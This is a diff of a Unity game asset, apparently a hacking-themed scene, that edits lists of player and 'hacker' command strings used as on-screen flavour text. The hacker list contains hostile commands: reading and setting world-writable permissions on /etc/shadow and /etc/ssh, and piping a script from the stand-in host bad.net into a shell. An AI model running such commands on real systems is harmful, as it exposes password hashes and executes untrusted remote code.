@@ -13979,14 +13979,14 @@ MonoBehaviour:
   lossInfection: 0
   lossParameter: 3
   playerCommands:
-  - ssh operator@auth
+  - 'ss -tnp | grep :22'
   - tail -f /var/log/auth.log
   - grep denied auth.log
   - sudo service ssh restart
   hackerCommands:
-  - ssh root@auth
-  - cat /etc/shadow
-  - chmod 777 /etc/shadow
+  - sudo -l
+  - sudo cat /etc/shadow
+  - sudo chmod 777 /etc/ssh
   - curl bad.net/x | sh
   hackerCharacterSeconds: 0.24
   hackerTimingVariance: 0.35
